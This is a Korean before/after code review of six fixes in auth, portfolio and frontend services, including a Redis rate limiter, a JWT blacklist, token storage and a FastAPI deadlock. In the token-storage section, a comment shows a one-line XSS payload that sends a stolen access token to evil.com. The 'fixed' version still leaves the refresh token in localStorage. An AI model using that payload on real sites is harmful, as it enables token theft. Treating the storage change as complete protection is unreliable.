# Before → After: 핵심 수정 사례 시각화

4개 서비스에서 가장 임팩트 있었던 수정 6건을 Before/After 코드로 비교합니다.

---

## 1. Rate Limiter 레이스 컨디션

**서비스**: auth-service
**이슈**: C4 — Rate Limiting 없음 (Brute Force 취약)
**파일**: `RateLimitInterceptor.java`

### Before

Rate Limiting이 아예 없었다. 로그인 API에 호출 제한이 없어서 봇이 초당 수천 번 비밀번호를 시도할 수 있었다.

```java
// SecurityConfig.java — Rate Limiting 없음
http
    .authorizeHttpRequests(auth -> auth
        .requestMatchers("/api/auth/login").permitAll()    // 무제한 접근
        .requestMatchers("/api/auth/signup").permitAll()   // 무제한 접근
        .anyRequest().authenticated()
    );

// 아무런 호출 제한 없이 누구나 무한 요청 가능
// → 봇이 비밀번호를 초당 수천 번 시도 가능
// → "aaaaaaaa" 같은 약한 비밀번호는 몇 초면 뚫림
```

### 문제점

1. **Brute Force 무방비**: 공격자가 로그인 엔드포인트에 초당 수천 건 요청 가능
2. **Credential Stuffing**: 유출된 이메일/비밀번호 목록으로 대량 시도 가능
3. **서비스 과부하**: 악의적 대량 요청으로 정상 사용자 서비스 방해

### After

```java
@Slf4j
@Component
@RequiredArgsConstructor
public class RateLimitInterceptor implements HandlerInterceptor {

    private final RedisTemplate<String, String> redisTemplate;

    private static final String RATE_LIMIT_PREFIX = "rate_limit:";
    private static final int MAX_REQUESTS_PER_MINUTE = 10;
    private static final long WINDOW_SECONDS = 60;

    private static final Set<String> RATE_LIMITED_PATHS = Set.of(
            "/api/auth/login",
            "/api/auth/signup"
    );

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        String path = request.getRequestURI();
        if (!RATE_LIMITED_PATHS.contains(path)) {
            return true;
        }

        String clientIp = getClientIp(request);
        String key = RATE_LIMIT_PREFIX + path + ":" + clientIp;

        // Redis INCR은 원자적 — 레이스 컨디션 없음
        Long currentCount = redisTemplate.opsForValue().increment(key);

        if (currentCount != null && currentCount == 1) {
            redisTemplate.expire(key, WINDOW_SECONDS, TimeUnit.SECONDS);
        }

        if (currentCount != null && currentCount > MAX_REQUESTS_PER_MINUTE) {
            Long ttl = redisTemplate.getExpire(key, TimeUnit.SECONDS);
            long retryAfter = (ttl != null && ttl > 0) ? ttl : WINDOW_SECONDS;

            response.setStatus(HttpStatus.TOO_MANY_REQUESTS.value());
            response.setHeader("Retry-After", String.valueOf(retryAfter));
            // ... JSON 에러 응답 반환
            return false;
        }
        return true;
    }
}
```

### 개선 효과

- **Brute Force 방어**: IP당 분당 10회 제한 → 약한 비밀번호도 사실상 공격 불가
- **원자적 카운팅**: Redis `INCR`은 단일 명령어로 읽기+증가+반환이 원자적 → 동시 요청에서도 정확한 카운트
- **자동 정리**: Redis TTL로 윈도우 만료 시 자동 카운터 삭제 → 메모리 누수 없음
- **Retry-After 헤더**: RFC 7231 준수, 클라이언트가 재시도 시점을 알 수 있음

---

## 2. JWT 토큰 블랙리스트

**서비스**: auth-service
**이슈**: C6 — Access Token 블랙리스트 없음 (로그아웃 불완전)
**파일**: `JwtTokenProvider.java`, `JwtAuthenticationFilter.java`

### Before

```java
// AuthService.java — 로그아웃
public void logout(Long userId) {
    // refresh token만 삭제
    jwtTokenProvider.deleteRefreshToken(userId);
    // access token은? → 아무것도 안 함
    // → 로그아웃해도 access token이 만료(30분)까지 유효
}

// JwtAuthenticationFilter.java — 매 요청마다 토큰 검증
if (token != null && jwtTokenProvider.validateToken(token)) {
    // 블랙리스트 체크 없음
    // → 로그아웃한 토큰으로도 API 접근 가능
    Authentication auth = jwtTokenProvider.getAuthentication(token);
    SecurityContextHolder.getContext().setAuthentication(auth);
}
```

### 문제점

1. **로그아웃 무의미**: 공용 PC에서 로그아웃해도 access token이 30분간 유효
2. **토큰 탈취 대응 불가**: 네트워크 스니핑으로 토큰이 탈취되면 즉시 무효화할 방법 없음
3. **JWT의 본질적 한계**: JWT는 stateless이므로 서버가 일방적으로 무효화할 수 없음 → 블랙리스트가 유일한 해결책

### After

```java
// JwtTokenProvider.java — 블랙리스트 등록
public void blacklistAccessToken(String token) {
    try {
        Claims claims = getClaims(token);
        Date expiration = claims.getExpiration();
        long remainingMs = expiration.getTime() - System.currentTimeMillis();

        if (remainingMs > 0) {
            String key = BLACKLIST_PREFIX + token;
            // TTL = 토큰 잔여 만료시간 → 만료되면 Redis에서 자동 삭제
            redisTemplate.opsForValue().set(key, "1", remainingMs, TimeUnit.MILLISECONDS);
        }
    } catch (Exception e) {
        log.warn("Failed to blacklist access token: {}", e.getMessage());
    }
}

// JwtTokenProvider.java — 블랙리스트 확인
public boolean isBlacklisted(String token) {
    String key = BLACKLIST_PREFIX + token;
    return Boolean.TRUE.equals(redisTemplate.hasKey(key));
}

// JwtAuthenticationFilter.java — 매 요청마다 블랙리스트 체크 추가
if (token != null && jwtTokenProvider.validateToken(token)) {
    // ★ 블랙리스트 체크 추가
    if (jwtTokenProvider.isBlacklisted(token)) {
        throw new BusinessException(ErrorCode.TOKEN_EXPIRED);
    }
    Authentication auth = jwtTokenProvider.getAuthentication(token);
    SecurityContextHolder.getContext().setAuthentication(auth);
}
```

### 개선 효과

- **즉시 무효화**: 로그아웃 시 access token이 즉시 차단됨
- **자동 정리**: TTL = 토큰 잔여 수명 → 만료 후 Redis에서 자동 삭제 → 메모리 무한 증가 방지
- **성능 영향 최소**: Redis `hasKey`는 O(1) 연산, 요청당 ~0.1ms 추가

---

## 3. Covariance Matrix Regularization

**서비스**: portfolio-service
**이슈**: 공분산 행렬 정칙화 없음 → 최적화 불안정
**파일**: `optimizer.py`, `covariance.py`

### Before

```python
# data.py — 공분산 행렬 계산
def get_returns_and_covariance(tickers, period="3y"):
    returns_df = fetch_returns(tickers, period)
    mu = returns_df.mean().values
    # 단순 표본 공분산 — 정칙화 없음
    cov = np.cov(returns_df.values, rowvar=False)
    return mu, cov, returns_df

# optimizer.py — 최적화
def optimize_min_variance(mu, cov):
    n = len(mu)
    w0 = np.ones(n) / n
    bounds = [(0, 1)] * n
    constraints = [{"type": "eq", "fun": lambda w: np.sum(w) - 1}]

    result = minimize(
        lambda w: w @ cov @ w,  # ill-conditioned cov → 음수 가중치, 발산
        w0, method="SLSQP",
        bounds=bounds, constraints=constraints
    )
    return result.x
```

### 문제점

1. **ill-conditioned 행렬**: 상관관계가 높은 자산(AAPL/MSFT 등)이 포함되면 조건수(condition number)가 10^15 이상으로 폭발
2. **음수 고유값**: 수치 오차로 인해 양정치(positive semi-definite) 조건 위반 가능
3. **최적화 불안정**: SLSQP가 수렴하지 않거나, 극단적 비중(한 종목 100%) 결과
4. **재현 불가**: 동일 입력에 다른 결과가 나올 수 있음

### After

```python
# covariance.py — Ledoit-Wolf Shrinkage 추정
def shrinkage_covariance(returns: NDArray[np.float64]) -> NDArray[np.float64]:
    """표본 공분산의 추정 오류를 줄이기 위해 구조화된 타겟으로 수축"""
    lw = LedoitWolf()
    lw.fit(returns)
    return lw.covariance_

# optimizer.py — 공분산 검증 + 정칙화
def validate_covariance_matrix(cov, max_condition_number=1e12):
    """대칭성, 양정치성, 조건수, 완전상관 검사"""
    eigenvalues = np.linalg.eigvalsh(cov)
    min_eigenvalue = float(eigenvalues.min())
    cond_number = float(np.linalg.cond(cov))
    # ... 5가지 검증 수행
    return CovarianceValidation(is_valid=..., issues=..., condition_number=...)

def regularize_covariance(cov, validation, target_condition_number=1e8):
    """ill-conditioned 행렬 자동 정규화"""
    eigenvalues, eigenvectors = np.linalg.eigh(cov)

    # 1단계: 음의 고유값 → 0으로 클리핑
    eigenvalues = np.maximum(eigenvalues, 0)
    cov_reg = eigenvectors @ np.diag(eigenvalues) @ eigenvectors.T

    # 2단계: 조건수 개선 (Ridge regularization)
    target_min_eig = eigenvalues.max() / target_condition_number
    current_min_eig = eigenvalues[eigenvalues > 0].min()
    if current_min_eig < target_min_eig:
        ridge = target_min_eig - current_min_eig
        cov_reg = cov_reg + ridge * np.eye(n)

    # 대칭성 보장
    cov_reg = (cov_reg + cov_reg.T) / 2
    return cov_reg, new_validation
```

### 개선 효과

- **Shrinkage 추정**: 표본 공분산 대비 평균 30~50% 낮은 추정 오차 (Ledoit & Wolf, 2004)
- **수치 안정성**: 조건수를 10^8 이하로 보장 → SLSQP 안정적 수렴
- **자동 복구**: ill-conditioned 행렬 감지 시 자동으로 정칙화 수행
- **진단 정보**: `CovarianceValidation` + `OptimizationDiagnostics`로 투명한 문제 추적

---

## 4. Access Token localStorage 노출

**서비스**: frontend
**이슈**: C1 — Access Token이 localStorage에 평문 저장
**파일**: `authStore.ts`

### Before

```typescript
// authStore.ts — Zustand persist
export const useAuthStore = create<AuthStore>()(
  persist(
    (set) => ({
      user: null,
      accessToken: null,      // ← localStorage에 저장됨!
      refreshToken: null,     // ← localStorage에 저장됨!
      isAuthenticated: false,

      setTokens: (accessToken, refreshToken) =>
        set({ accessToken, refreshToken, isAuthenticated: true }),

      logout: () =>
        set({ user: null, accessToken: null, refreshToken: null,
              isAuthenticated: false }),
    }),
    {
      name: 'aether-auth',
      // partialize 없음 → 모든 state가 localStorage에 저장
      // DevTools > Application > localStorage > aether-auth:
      // {"state":{"accessToken":"eyJhbG...","refreshToken":"eyJhbG...",...}}
    }
  )
);

// XSS 한 줄이면 토큰 탈취 가능:
// fetch('https://evil.com/steal?token=' + JSON.parse(localStorage.getItem('aether-auth')).state.accessToken)
```

### 문제점

1. **XSS 토큰 탈취**: `localStorage.getItem('aether-auth')`로 accessToken + refreshToken 모두 탈취 가능
2. **영구 저장**: 브라우저를 닫아도 토큰이 남아있음 → 공유 PC에서 위험
3. **모든 탭 노출**: 같은 도메인의 모든 JavaScript에서 접근 가능

### After

```typescript
export const useAuthStore = create<AuthStore>()(
  persist(
    (set) => ({
      user: null,
      accessToken: null,       // 메모리에만 존재
      isAuthenticated: false,
      _hasHydrated: false,     // SSR hydration 제어

      setHasHydrated: (hydrated) => set({ _hasHydrated: hydrated }),

      setTokens: (accessToken, refreshToken) => {
        // refreshToken만 별도 키로 localStorage에 저장
        if (typeof window !== 'undefined') {
          localStorage.setItem('aether-refresh-token', refreshToken);
        }
        // accessToken은 Zustand state(메모리)에만 저장
        set({ accessToken, isAuthenticated: true });
      },

      logout: () => {
        if (typeof window !== 'undefined') {
          localStorage.removeItem('aether-refresh-token');
        }
        set({ user: null, accessToken: null, isAuthenticated: false });
      },

      getRefreshToken: () => {
        if (typeof window !== 'undefined') {
          return localStorage.getItem('aether-refresh-token');
        }
        return null;
      },
    }),
    {
      name: 'aether-auth',
      // ★ accessToken을 persist에서 제외 — 메모리에만 보관
      partialize: (state) => ({
        user: state.user,
        isAuthenticated: state.isAuthenticated,
      }),
      onRehydrateStorage: () => (state) => {
        state?.setHasHydrated(true);
      },
    }
  )
);
```

### 개선 효과

- **accessToken 보호**: XSS로 localStorage를 덤프해도 accessToken 없음
- **refreshToken 분리**: 별도 키로 저장 → `partialize`와 독립적으로 관리
- **새로고침 처리**: 새로고침 시 accessToken 소멸 → refreshToken으로 자동 재발급 (인터셉터에서 처리)
- **SSR 안정화**: `_hasHydrated` 플래그로 hydration mismatch 방지

---

## 5. API 인터셉터 없음

**서비스**: frontend
**이슈**: C3 — 401 처리 불가, 토큰 수동 주입
**파일**: `client.ts` (신규)

### Before

```typescript
// 각 API 호출마다 토큰을 수동으로 주입
const response = await fetch('/api/optimize', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${accessToken}`,  // 매번 수동
  },
  body: JSON.stringify(data),
});

// 401 응답 시? → 아무 처리 없음
// → "알 수 없는 에러" 표시
// → 사용자가 새로고침 or 재로그인해야 함

// 문제 시나리오:
// 1. 사용자가 30분 동안 대시보드 사용
// 2. access token 만료
// 3. "최적화 실행" 클릭 → 401 → "에러 발생" (사용자 혼란)
// 4. 수동으로 로그인 페이지 이동 → 재로그인 → 데이터 손실
```

### 문제점

1. **DRY 위반**: 모든 API 호출에 동일한 토큰 주입 로직 반복
2. **401 무처리**: 토큰 만료 시 사용자에게 암호 같은 에러 메시지
3. **동시 401 미처리**: 여러 API가 동시에 401을 받으면 refresh 요청도 여러 번 발생
4. **사용자 경험 단절**: 토큰 만료마다 작업 중단 + 재로그인

### After

```typescript
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (token: string) => void;
  reject: (error: unknown) => void;
}> = [];

function processQueue(error: unknown, token: string | null) {
  failedQueue.forEach(({ resolve, reject }) => {
    error ? reject(error) : resolve(token!);
  });
  failedQueue = [];
}

export function createApiClient(baseURL: string): AxiosInstance {
  const instance = axios.create({ baseURL });

  // ★ Request 인터셉터: accessToken 자동 주입
  instance.interceptors.request.use((config) => {
    const { accessToken } = useAuthStore.getState();
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  });

  // ★ Response 인터셉터: 401 → 자동 갱신 → 원래 요청 재시도
  instance.interceptors.response.use(
    (response) => response,
    async (error) => {
      const originalRequest = error.config;

      if (error.response?.status !== 401 || originalRequest._retry) {
        return Promise.reject(error);
      }

      // refresh 엔드포인트 자체가 401이면 로그아웃
      if (originalRequest.url?.includes('/api/auth/refresh')) {
        useAuthStore.getState().logout();
        window.location.href = '/login';
        return Promise.reject(error);
      }

      // ★ 동시 401 처리: 이미 refresh 중이면 큐에 대기
      if (isRefreshing) {
        return new Promise<string>((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then((token) => {
          originalRequest.headers.Authorization = `Bearer ${token}`;
          return instance(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        const refreshToken = useAuthStore.getState().getRefreshToken();
        const response = await axios.post(
          `${API_URLS.AUTH}/api/auth/refresh`,
          { refreshToken }
        );
        const { accessToken, refreshToken: newRefresh } = response.data.data;
        useAuthStore.getState().setTokens(accessToken, newRefresh);
        processQueue(null, accessToken);

        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return instance(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        useAuthStore.getState().logout();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
  );

  return instance;
}
```

### 개선 효과

- **토큰 자동 주입**: 모든 API 호출에 `Authorization` 헤더 자동 부착 → 호출부에서 토큰 신경 쓸 필요 없음
- **투명한 토큰 갱신**: 사용자가 인지하지 못하는 사이에 토큰 갱신 + 원래 요청 재시도
- **동시 401 큐**: `isRefreshing` + `failedQueue`로 여러 요청이 동시에 401을 받아도 refresh 요청은 1번만 발생
- **팩토리 패턴**: `createApiClient(baseURL)`로 서비스별 클라이언트 생성 → auth, portfolio, llm 각각 독립

---

## 6. async def + BaseHTTPMiddleware 충돌

**서비스**: portfolio-service (통합 테스트에서 발견)
**이슈**: 통합 #8 — API 타임아웃
**파일**: `optimize.py`, `backtest.py`, `risk.py`, `experiment.py`, `logging.py`

### Before

```python
# middleware/logging.py — 미들웨어에서 body를 읽어 로깅
class RequestLoggingMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable) -> Response:
        # ★ 여기서 request body stream을 소비
        request_body = None
        if request.method in ["POST", "PUT", "PATCH"]:
            body_bytes = await request.body()
            if body_bytes:
                request_body = json.loads(body_bytes.decode("utf-8"))

        logger.info("request_started", body=request_body, ...)

        response = await call_next(request)  # → 엔드포인트 호출
        return response


# routers/optimize.py — async def + blocking I/O
@router.post("/optimize", response_model=OptimizeResponse)
async def optimize_portfolio(request: OptimizeRequest):
    """
    async def이지만 내부에 await가 단 하나도 없음.
    yfinance(네트워크 I/O), scipy(CPU), MLflow(파일 I/O) 모두 blocking.

    async def → 이벤트 루프에서 직접 실행
    → yfinance.download()이 30초간 이벤트 루프를 블로킹
    → health check, 다른 요청 모두 대기
    """
    data_result = get_returns_and_covariance_resilient(  # blocking yfinance
        tickers=tickers, period=request.period
    )
    result = optimize_min_variance(mu, cov)              # blocking scipy
    # ... 응답 생성
```

### 문제점

1. **async def + blocking I/O**: FastAPI의 async 엔드포인트는 이벤트 루프에서 실행됨. blocking I/O가 있으면 전체 서버가 멈춤
2. **BaseHTTPMiddleware + body 소비**: 미들웨어에서 `await request.body()`로 stream을 소비하면, `def` 엔드포인트(threadpool)에서 body를 읽을 때 deadlock 발생
3. **첫 요청도 실패**: 단일 요청에서도 미들웨어-엔드포인트 간 stream 충돌로 hang

### After

```python
# middleware/logging.py — body 로깅 제거
class RequestLoggingMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable) -> Response:
        # body는 로깅하지 않음 — BaseHTTPMiddleware stream 충돌 방지
        logger.info(
            "request_started",
            method=request.method,
            path=request.url.path,
            query_params=dict(request.query_params),
            client_ip=request.client.host if request.client else None
        )
        response = await call_next(request)
        return response


# routers/optimize.py — def (sync) 엔드포인트
@router.post("/optimize", response_model=OptimizeResponse)
def optimize_portfolio(request: OptimizeRequest):
    """
    def → FastAPI가 자동으로 threadpool에서 실행
    → 이벤트 루프 블로킹 없음
    → health check, 다른 요청 정상 처리
    """
    data_result = get_returns_and_covariance_resilient(
        tickers=tickers, period=request.period
    )
    result = optimize_min_variance(mu, cov)
    # ... 응답 생성
```

### 개선 효과

- **이벤트 루프 보호**: `def` 엔드포인트는 threadpool에서 실행 → yfinance가 30초 걸려도 이벤트 루프에 영향 없음
- **deadlock 해소**: 미들웨어가 request body stream을 소비하지 않으므로 threadpool의 엔드포인트와 충돌 없음
- **응답 시간**: 타임아웃(무한 대기) → 정상 응답 (yfinance fetch + 최적화 = 5~15초)
- **동시 처리**: threadpool 기본 40개 워커 → 동시에 40개 요청까지 병렬 처리 가능

### 핵심 교훈

```
┌─────────────────────────────────────────────────────────┐
│  FastAPI: async def vs def 선택 가이드                    │
│                                                         │
│  await 호출이 있다 → async def                           │
│    (httpx, asyncpg, aioredis, aiofiles)                 │
│                                                         │
│  blocking I/O가 있다 → def                               │
│    (requests, yfinance, psycopg2, open())               │
│                                                         │
│  CPU-bound만 있다 → def                                  │
│    (numpy, scipy, pandas, scikit-learn)                  │
│                                                         │
│  ⚠️  async def + blocking I/O = 이벤트 루프 블로킹        │
│  ⚠️  BaseHTTPMiddleware + await body + def = deadlock    │
└─────────────────────────────────────────────────────────┘
```

---

## 요약

| # | 서비스 | 이슈 | 핵심 변화 | 위험도 |
|---|--------|------|----------|--------|
| 1 | auth | Rate Limiter | 무방비 → Redis 원자적 카운팅 (IP당 10회/분) | Critical |
| 2 | auth | JWT 블랙리스트 | 로그아웃 무의미 → TTL 기반 즉시 무효화 | Critical |
| 3 | portfolio | 공분산 정칙화 | 불안정 최적화 → Shrinkage + Eigenvalue 클리핑 + Ridge | Critical |
| 4 | frontend | 토큰 저장 | localStorage 평문 → 메모리 전용 + refreshToken 분리 | Critical |
| 5 | frontend | API 인터셉터 | 수동 주입 + 401 무처리 → 자동 갱신 + 동시 요청 큐 | Critical |
| 6 | 통합 | async/middleware | 무한 대기 → def(threadpool) + body 로깅 제거 | Critical |

6개 사례 모두 **단위 테스트만으로는 발견하기 어려운** 실제 운영 환경의 문제들이다. 코드 리뷰 + 통합 테스트의 조합으로 서비스 전반의 보안, 안정성, 정확성을 확보했다.
